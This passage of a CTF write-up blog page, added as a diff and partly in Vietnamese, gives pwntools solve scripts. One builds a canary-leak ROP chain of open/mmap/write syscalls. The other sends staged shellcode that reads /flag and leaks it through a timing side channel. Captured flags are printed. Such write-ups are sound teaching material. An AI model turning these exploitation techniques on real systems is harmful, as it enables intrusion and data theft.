+</span></span><span style="display:flex;"><span>write_note(<span style="color:#ae81ff">0</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>write_note(<span style="color:#ae81ff">3</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1740</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>) 
+</span></span><span style="display:flex;"><span>read_note(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x10</span>):
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x100</span>)
+</span></span><span style="display:flex;"><span>	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">0.5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x760</span><span style="color:#f92672">+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;canary = </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">//</span> fill buff <span style="color:#f92672">and</span> saved_rbp
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> flat(pop_rax, <span style="color:#ae81ff">2</span>, pop_rdi, base<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf00</span>, pop_rsi, <span style="color:#ae81ff">0</span>, pop_rdx, <span style="color:#ae81ff">0</span>,\
+</span></span><span style="display:flex;"><span>                syscall_ret, pop_rax, <span style="color:#ae81ff">9</span>, pop_rdi, <span style="color:#ae81ff">0x13370000</span>, pop_rsi, <span style="color:#ae81ff">0x1000</span>,\ <span style="color:#75715e"># open</span>
+</span></span><span style="display:flex;"><span>                pop_rdx, <span style="color:#ae81ff">7</span>, pop_r10, <span style="color:#ae81ff">2</span>, pop_r8, <span style="color:#ae81ff">3</span>, pop_r9, <span style="color:#ae81ff">0</span>, syscall_ret,\  <span style="color:#75715e"># mmap</span>
+</span></span><span style="display:flex;"><span>                pop_rax, <span style="color:#ae81ff">1</span>, pop_rdi, <span style="color:#ae81ff">1</span>, pop_rsi, <span style="color:#ae81ff">0x13370000</span>, pop_rdx, <span style="color:#ae81ff">0x40</span>, syscall_ret) <span style="color:#75715e"># write</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><strong>$ flag:</strong> SEE{m4st3r_0f_mm4p_5ee2a719bc6a8209e7295d4095ff5181}</p>
+<h1 id="shellcode-as-a-service">Shellcode As A Service</h1>
+<p><code>Description: Hey, welcome to my new SaaS platform! As part of our early access program, we are offering the service for FREE. Our generous free tier gives you a whole SIX BYTES of shellcode to run on our server. What are you waiting for? Sign up now!</code></p>
+<p>Như chương trình đã mô tả, chúng ta phải viết shellcode sẽ được đưa vào để thực thi.
+Được cấp cho 6 bytes và có cho phép 2 syscall open, read, ngăn chặn chúng ta in flag ra màn hình. Ý tưởng là chúng ta sẽ viết 1 vòng lặp để kiểm tra từng bit của flag, nếu bit bằng 1 sẽ cho vào 1 vòng lặp, còn ngược lại thì bit bằng 0.
+Một cách khác là ta sẽ đọc từng bytes của flag rồi kiểm tra từng kí tự của flag.</p>
+<p>Ngay lúc này, thanh ghi rdi đang có giá trị bằng 0, rdx thì là địa chỉ nơi mà shellcode chúng ta ghi nên chúng ta chỉ cần lấy giá trị đó là đủ để ghi tiếp (second stage write).</p>
+<p><strong>Solve scripts</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.aslr = False</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.timeout = 2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">riconn</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> local
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> debug
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:]:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--local&#39;</span>):
+</span></span><span style="display:flex;"><span>			local <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--debug&#39;</span>):
+</span></span><span style="display:flex;"><span>			debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> local:
+</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chall&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> debug:
+</span></span><span style="display:flex;"><span>			gdb<span style="color:#f92672">.</span>attach(s, gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			raw_input(<span style="color:#e6db74">&#39;DEBUG&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;103.162.14.240&#39;</span>, <span style="color:#ae81ff">15001</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> io
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./chall&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#libc = ELF(&#39;libc.so.6&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">chill</span>(offset):
+</span></span><span style="display:flex;"><span>    bin <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> riconn()
+</span></span><span style="display:flex;"><span>        stage1 <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        xor edi, edi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov esi, edx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>send(stage1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        stage2 <span style="color:#f92672">=</span> asm((<span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        .rept 0x6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        nop
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        .endr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span> 
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">+</span> shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;/flag&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">+</span> shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#39;rax&#39;</span>, <span style="color:#e6db74">&#39;rsp&#39;</span>, <span style="color:#ae81ff">0x100</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            xor r11, r11
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            xor rax, rax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            mov al, [rsp+</span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            shr al, </span><span style="color:#e6db74">{</span>bit<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            shl al, 7
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            shr al, 7
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        loop:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            cmp rax, r11
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            je end
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            jmp loop
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        end:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        ), arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>send(stage2)
+</span></span><span style="display:flex;"><span>        start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>        now <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (now <span style="color:#f92672">-</span> start) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>            bin <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            bin <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    byte <span style="color:#f92672">=</span> int(bin[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> byte
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tmp <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
+</span></span><span style="display:flex;"><span>    tmp<span style="color:#f92672">.</span>append(chill(i))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> tmp[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;}&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> [x<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> tmp]
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(flag)
+</span></span></code></pre></div><p><strong>$ flag:</strong> SEE{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}</p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/ctf/">#ctf</a>
+        
+            <a
+                
+                href="/tags/pwn/">#pwn</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2023 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
